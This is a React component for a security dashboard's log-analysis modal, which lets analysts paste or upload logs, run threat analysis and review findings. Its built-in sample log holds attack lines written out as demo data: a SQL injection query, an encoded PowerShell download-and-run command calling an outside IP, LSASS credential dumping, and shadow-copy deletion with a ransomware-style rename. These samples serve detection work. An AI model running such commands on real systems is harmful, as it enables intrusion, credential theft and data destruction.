import React, { useEffect, useRef, useState } from 'react';
import {
  X, FileUp, FileSearch, ShieldAlert, Loader2, AlertTriangle,
  CheckCircle2, History, PencilLine, Sparkles,
} from 'lucide-react';
import { api } from '../../services/api';
import { AnalysisRun, AnalysisRunSummary } from '../../types';

interface LogAnalysisModalProps {
  isOpen: boolean;
  onClose: () => void;
  onAnalysisComplete: (result: AnalysisRun) => void;
}

const SAMPLE_LOG = `<134>Sep 10 09:15:22 dc-prod-01 sshd[1234]: Failed password for root from 45.227.255.9 port 55222 ssh2
<134>Sep 10 09:15:23 dc-prod-01 sshd[1234]: Failed password for admin from 45.227.255.9 port 55223 ssh2
<134>Sep 10 09:15:24 dc-prod-01 sshd[1234]: Failed password for sa from 45.227.255.9 port 55224 ssh2
<134>Sep 10 09:15:31 web-portal-01 nginx[8901]: 194.26.29.114 - - [10/Sep/2026:09:15:31 +0000] "GET /api/staff/search?dept=finance' UNION SELECT 1,username,3 FROM users-- HTTP/1.1" 500 512
<134>Sep 10 09:16:02 ws-finance-09 powershell[4021]: powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADcALgAzADIALgA2ADUALgAxADIALwBhACcAKQAgAC0AdwBpAG4AZABvAHcAcwB0AHkAbABlACAAaABpAGQAZABlAG4A
<134>Sep 10 09:16:10 ws-finance-09 sysmon[9088]: Process accessed lsass.exe with PROCESS_VM_READ (procdump.exe)
<134>Sep 10 09:17:00 file-srv-02 wscript[4555]: vssadmin delete shadows /all /quiet && ren *.docs *.lock`;

const SEVERITY_STYLES: Record<string, string> = {
  critical: 'bg-rose-950 text-rose-300 border-rose-800',
  high: 'bg-orange-950 text-orange-300 border-orange-800',
  medium: 'bg-amber-950 text-amber-300 border-amber-800',
  low: 'bg-gray-900 text-gray-400 border-gray-700',
};

export const LogAnalysisModal: React.FC<LogAnalysisModalProps> = ({
  isOpen,
  onClose,
  onAnalysisComplete,
}) => {
  const [content, setContent] = useState(SAMPLE_LOG);
  const [sourceName, setSourceName] = useState('pasted-log.txt');
  const [createAlerts, setCreateAlerts] = useState(true);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AnalysisRun | null>(null);
  const [recentRuns, setRecentRuns] = useState<AnalysisRunSummary[]>([]);
  const [error, setError] = useState<string | null>(null);
  const fileRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!isOpen) return;
    setError(null);
    setResult(null);
    api.getAnalysisRuns(5).then((d) => setRecentRuns(d.runs || [])).catch(() => setRecentRuns([]));
  }, [isOpen]);

  if (!isOpen) return null;

  const handleFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      setContent(String(reader.result || ''));
      setSourceName(file.name);
      setResult(null);
    };
    reader.readAsText(file);
    e.target.value = '';
  };

  const handleAnalyze = async () => {
    if (!content.trim() || loading) return;
    setLoading(true);
    setError(null);
    try {
      const run = await api.analyzeLog(content, { source: sourceName, createAlerts });
      setResult(run);
      onAnalysisComplete(run);
      const runs = await api.getAnalysisRuns(5);
      setRecentRuns(runs.runs || []);
    } catch (err) {
      console.error(err);
      setError('Analysis failed — check that the server is running and you have analyst permissions.');
    } finally {
      setLoading(false);
    }
  };

  const handleLoadRun = async (id: string) => {
    try {
      const detail = await api.getAnalysisRun(id);
      if (detail.events?.length) {
        setContent(detail.events.map((e) => e.line).join('\n'));
        setSourceName(detail.source);
        setResult(null);
      }
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
      <div className="relative w-full max-w-3xl max-h-[90vh] overflow-y-auto rounded-2xl border border-cyan-500/30 bg-gray-950 p-6 shadow-[0_0_40px_rgba(34,211,238,0.12)]">
        <button
          onClick={onClose}
          className="absolute right-4 top-4 rounded-lg p-1.5 text-gray-400 hover:bg-gray-900 hover:text-gray-200 cursor-pointer"
        >
          <X className="h-5 w-5" />
        </button>

        <div className="flex items-center gap-3 mb-5">
          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400">
            <FileSearch className="h-5 w-5" />
          </div>
          <div>
            <h3 className="font-mono text-base font-bold text-gray-100 uppercase tracking-wide">
              Log &amp; Data Analysis
            </h3>
            <p className="text-xs text-gray-400">
              Paste or edit log data, or upload a log file — the engine parses syslog, JSON, and plain-text logs, then runs threat analysis (no ML training required).
            </p>
          </div>
        </div>

        {error && (
          <div className="mb-4 flex items-center gap-2 rounded-lg bg-rose-950/60 border border-rose-800/80 p-3 text-xs text-rose-300">
            <AlertTriangle className="h-4 w-4 text-rose-400 shrink-0" />
            <span className="font-mono">{error}</span>
          </div>
        )}

        {/* Input: paste/edit or upload */}
        <div className="space-y-3">
          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={() => fileRef.current?.click()}
              className="flex items-center gap-1.5 rounded-lg bg-cyan-600/20 hover:bg-cyan-600/30 border border-cyan-700/60 px-3 py-2 text-xs font-mono font-bold text-cyan-300 transition-all cursor-pointer"
            >
              <FileUp className="h-4 w-4" />
              Upload Log File
            </button>
            <span className="text-[11px] font-mono text-gray-500">.log · .txt · .csv · .json (up to 2 MB)</span>
            <div className="flex-1" />
            <div className="flex items-center gap-1.5 text-[11px] font-mono text-gray-400">
              <PencilLine className="h-3.5 w-3.5 text-gray-500" />
              <input
                value={sourceName}
                onChange={(e) => setSourceName(e.target.value)}
                placeholder="source name"
                className="w-40 rounded-md border border-gray-800 bg-gray-900 px-2 py-1 text-gray-200 placeholder-gray-600 focus:border-cyan-600 focus:outline-none"
              />
            </div>
          </div>
          <input ref={fileRef} type="file" accept=".log,.txt,.csv,.json,text/plain,application/json" className="hidden" onChange={handleFile} />

          <textarea
            value={content}
            onChange={(e) => { setContent(e.target.value); setResult(null); }}
            rows={12}
            spellCheck={false}
            className="w-full rounded-xl border border-gray-800 bg-gray-900 p-3 text-xs font-mono text-gray-300 placeholder-gray-600 focus:border-cyan-500 focus:outline-none"
            placeholder="Paste syslog, nginx/apache access logs, Windows event text, JSON lines, or any raw log data here..."
          />

          <div className="flex flex-wrap items-center justify-between gap-3">
            <label className="flex items-center gap-2 text-xs font-mono text-gray-300 cursor-pointer select-none">
              <input
                type="checkbox"
                checked={createAlerts}
                onChange={(e) => setCreateAlerts(e.target.checked)}
                className="h-4 w-4 rounded border-gray-700 bg-gray-900 accent-cyan-500"
              />
              Auto-create alerts for high/critical findings
            </label>
            <div className="flex items-center gap-2">
              <button
                onClick={onClose}
                className="rounded-lg border border-gray-800 bg-gray-900 px-4 py-2 text-xs font-mono text-gray-300 hover:bg-gray-800 transition-all cursor-pointer"
              >
                Close
              </button>
              <button
                onClick={handleAnalyze}
                disabled={loading || !content.trim()}
                className="flex items-center gap-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-50 px-5 py-2 text-xs font-mono font-bold text-white transition-all cursor-pointer shadow-[0_0_15px_rgba(34,211,238,0.25)]"
              >
                {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Sparkles className="h-4 w-4" />}
                {loading ? 'Analyzing...' : 'Run Threat Analysis'}
              </button>
            </div>
          </div>
        </div>

        {/* Results */}
        {result && (
          <div className="mt-6 space-y-4 rounded-xl border border-emerald-900/40 bg-gray-900/50 p-4">
            <div className="flex flex-wrap items-center gap-3">
              <CheckCircle2 className="h-5 w-5 text-emerald-400" />
              <span className="font-mono text-xs font-bold text-emerald-300">Analysis Complete</span>
              <span className="text-[11px] font-mono text-gray-500">{result.id} · {result.source}</span>
              <div className="flex-1" />
              <div className="flex gap-2 text-[10px] font-mono">
                <span className="rounded bg-gray-950 border border-gray-800 px-2 py-1 text-gray-300">{result.eventCount} events</span>
                <span className={`rounded border px-2 py-1 ${result.suspiciousCount > 0 ? 'bg-amber-950/60 border-amber-800 text-amber-300' : 'bg-gray-950 border-gray-800 text-gray-300'}`}>
                  {result.suspiciousCount} suspicious
                </span>
                <span className={`rounded border px-2 py-1 ${result.alertsCreated > 0 ? 'bg-rose-950/60 border-rose-800 text-rose-300' : 'bg-gray-950 border-gray-800 text-gray-300'}`}>
                  {result.alertsCreated} alert(s) created
                </span>
              </div>
            </div>
            <p className="text-xs text-gray-300 font-mono leading-relaxed">{result.summary}</p>

            {result.findings.length === 0 ? (
              <div className="flex items-center gap-2 rounded-lg border border-emerald-900/40 bg-emerald-950/20 p-3 text-xs text-emerald-300">
                <ShieldAlert className="h-4 w-4 text-emerald-400" />
                No threat signatures matched — the log appears clean.
              </div>
            ) : (
              <div className="space-y-2.5">
                {result.findings.map((f, i) => (
                  <div key={i} className="rounded-lg border border-gray-800 bg-gray-950/80 p-3">
                    <div className="flex items-center justify-between gap-2">
                      <span className="font-mono text-xs font-bold text-gray-100">{f.title}</span>
                      <span className={`shrink-0 rounded border px-2 py-0.5 text-[10px] font-mono font-bold uppercase ${SEVERITY_STYLES[f.severity]}`}>
                        {f.severity}
                      </span>
                    </div>
                    <p className="mt-1 text-[11px] text-gray-400 leading-relaxed">{f.description}</p>
                    {f.evidence.length > 0 && (
                      <details className="mt-2">
                        <summary className="cursor-pointer text-[10px] font-mono text-cyan-400 hover:text-cyan-300 select-none">
                          Show evidence ({f.evidence.length} line{f.evidence.length > 1 ? 's' : ''})
                        </summary>
                        <pre className="mt-1.5 max-h-28 overflow-y-auto rounded-md bg-gray-950 border border-gray-800 p-2 text-[10px] font-mono text-gray-400 whitespace-pre-wrap">
                          {f.evidence.join('\n')}
                        </pre>
                      </details>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Recent analyses */}
        {recentRuns.length > 0 && (
          <div className="mt-6">
            <h4 className="flex items-center gap-1.5 font-mono text-[11px] font-bold text-gray-400 uppercase mb-2">
              <History className="h-3.5 w-3.5 text-gray-500" /> Recent Analyses
            </h4>
            <div className="space-y-1.5">
              {recentRuns.map((r) => (
                <div key={r.id} className="flex items-center gap-3 rounded-lg border border-gray-800 bg-gray-900/50 px-3 py-2">
                  <div className="flex-1 min-w-0">
                    <p className="font-mono text-[11px] text-gray-200 truncate">{r.source}</p>
                    <p className="text-[10px] font-mono text-gray-500 truncate">
                      {r.id} · {r.eventCount} events · {r.findingsCount} findings · {new Date(r.createdAt).toLocaleString()}
                    </p>
                  </div>
                  <span className={`shrink-0 rounded border px-2 py-0.5 text-[10px] font-mono ${r.suspiciousCount > 0 ? 'border-amber-800 text-amber-300' : 'border-gray-700 text-gray-500'}`}>
                    {r.suspiciousCount} suspicious
                  </span>
                  <button
                    onClick={() => handleLoadRun(r.id)}
                    className="shrink-0 rounded-md border border-gray-700 bg-gray-900 px-2.5 py-1 text-[10px] font-mono text-cyan-400 hover:bg-gray-800 transition-all cursor-pointer"
                    title="Load this log back into the editor for editing / re-analysis"
                  >
                    Edit
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};